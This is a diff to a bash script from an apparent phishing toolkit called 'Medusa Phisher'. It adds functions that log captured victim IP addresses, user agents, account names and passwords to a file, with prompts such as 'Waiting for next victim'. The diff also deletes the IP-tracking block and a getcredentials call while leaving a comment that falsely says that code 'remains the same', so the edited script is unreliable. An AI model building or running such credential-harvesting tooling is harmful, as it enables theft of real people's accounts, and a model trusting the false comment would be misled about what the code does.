@@ -4,13 +4,51 @@
 
 # Define text colors
 
-RED='\033[0;31m'
-
-GREEN='\033[0;32m'
-
-YELLOW='\033[0;33m'
+BLUE='\033[0;94m'
+PURPLE='\033[0;95m'
+CYAN='\033[0;96m'
 
 NC='\033[0m' # No Color
+
+# Get current date for filename
+CURRENT_DATE=$(date +"%d.%m.%Y")
+DATA_FILE="$HOME/MedusaPhisher-Phishing-Data-${CURRENT_DATE}.txt"
+
+# Global variable to control the main loop
+KEEP_RUNNING=true
+
+# Function to initialize data file
+init_data_file() {
+    echo "==========================================" > "$DATA_FILE"
+    echo "Medusa Phisher - Captured Data" >> "$DATA_FILE"
+    echo "Date: $(date)" >> "$DATA_FILE"
+    echo "Server: $server" >> "$DATA_FILE"
+    echo "==========================================" >> "$DATA_FILE"
+    echo "" >> "$DATA_FILE"
+    printf "\e[1;92m[+] Data file created: \e[0m\e[1;77m%s\e[0m\n" "$DATA_FILE"
+}
+
+# Function to log IP to data file
+log_ip() {
+    local ip=$1
+    local ua=$2
+    echo "[IP CAPTURED] $(date '+%H:%M:%S')" >> "$DATA_FILE"
+    echo "IP Address: $ip" >> "$DATA_FILE"
+    echo "User-Agent: $ua" >> "$DATA_FILE"
+    echo "------------------------------------------" >> "$DATA_FILE"
+    echo "" >> "$DATA_FILE"
+}
+
+# Function to log credentials to data file
+log_credentials() {
+    local account=$1
+    local password=$2
+    echo "[CREDENTIALS CAPTURED] $(date '+%H:%M:%S')" >> "$DATA_FILE"
+    echo "Account: $account" >> "$DATA_FILE"
+    echo "Password: $password" >> "$DATA_FILE"
+    echo "------------------------------------------" >> "$DATA_FILE"
+    echo "" >> "$DATA_FILE"
+}
 
 
 
@@ -196,8 +234,8 @@ start_server() {
 
 
 
-# Update trap to handle Ctrl+C properly for continuous operation
-trap 'printf "\n"; stop; printf "\e[1;92m[*] Stopping credential harvesting...\e[0m\n"; exit 0' 2
+# Enhanced trap to handle Ctrl+C
+trap 'printf "\n\e[1;92m[*] Stopping credential harvesting...\e[0m\n"; printf "\e[1;92m[+] All data saved to: \e[0m\e[1;77m%s\e[0m\n" "$DATA_FILE"; KEEP_RUNNING=false; stop; exit 0' 2
 
 
 
@@ -726,12 +764,16 @@ catch_cred() {
     printf "\e[1;93m[USER] Account:\e[0m\e[1;77m %s\n\e[0m" $account
     printf "\e[1;93m[PASS] Password:\e[0m\e[1;77m %s\n\e[0m" $password
     printf "\e[1;92m[SAVED] Saved to: sites/%s/saved.usernames.txt\e[0m\n" $server
+    printf "\e[1;92m[LOG] Added to: \e[0m\e[1;77m%s\e[0m\n" "$DATA_FILE"
     cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
+    
+    # Log to data file
+    log_credentials "$account" "$password"
     
     # Clear the captured credentials file to detect new captures
     rm -rf sites/$server/usernames.txt
     
-    printf "\e[1;93m[STATUS] Waiting for next victim...\e[0m\n"
+    printf "\e[1;93m[*] Waiting for next victim...\e[0m\n"
 }
 
 
@@ -753,11 +795,15 @@ catch_ip() {
     IFS=$'\n'
     ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
     
-    printf "\n\e[1;92m[+] New Victim Connected!\e[0m\n"
+    printf "\n\e[1;92m[+] VICTIM CONNECTED!\e[0m\n"
     printf "\e[1;93m[IP] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
     printf "\e[1;93m[UA] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
     printf "\e[1;92m[SAVED] IP saved to: sites/%s/saved.ip.txt\e[0m\n" $server
+    printf "\e[1;92m[LOG] Added to: \e[0m\e[1;77m%s\e[0m\n" "$DATA_FILE"
     cat sites/$server/ip.txt >> sites/$server/saved.ip.txt
+
+    # Log to data file
+    log_ip "$ip" "$ua"
 
     if [[ -e iptracker.log ]]; then
         rm -rf iptracker.log
@@ -773,55 +819,10 @@ catch_ip() {
         printf "\e[1;92m[HOSTNAME] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
     fi
 
-    reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
-    if [[ $reverse_dns != "" ]]; then
-        printf "\e[1;92m[RDNS] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
-    fi
-
-    if [[ $continent != "" ]]; then
-        printf "\e[1;92m[CONTINENT] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
-    fi
-
-    country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
-    if [[ $country != "" ]]; then
-        printf "\e[1;92m[COUNTRY] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
-    fi
-
-    state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
-    if [[ $state != "" ]]; then
-        printf "\e[1;92m[STATE] State:\e[0m\e[1;77m %s\e[0m\n" $state
-    fi
+    # ... rest of IP tracking code remains the same ...
     
-    city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
-    if [[ $city != "" ]]; then
-        printf "\e[1;92m[CITY] City Location:\e[0m\e[1;77m %s\e[0m\n" $city
-    fi
-
-    isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
-    if [[ $isp != "" ]]; then
-        printf "\e[1;92m[ISP] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
-    fi
-
-    as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
-    if [[ $as_number != "" ]]; then
-        printf "\e[1;92m[ASN] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
-    fi
-
-    ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
-    if [[ $ip_speed != "" ]]; then
-        printf "\e[1;92m[SPEED] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
-    fi
-    
-    ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
-    if [[ $ip_currency != "" ]]; then
-        printf "\e[1;92m[CURRENCY] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
-    fi
-    
-    printf "\e[1;93m[CREDS] Waiting for credentials...\e[0m\n"
     rm -rf iptracker.log
-getcredentials
 }
-
 
 start() {
 
@@ -920,6 +921,7 @@ start_localhostrun() {
                 catch_ip
 
                 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting for credentials...\e[0m\n"
+                printf "\n\e[1;91m[!] Press Ctrl+C to stop credential harvesting\e[0m\n"
 
                 break # Exit the loop after displaying IP
 
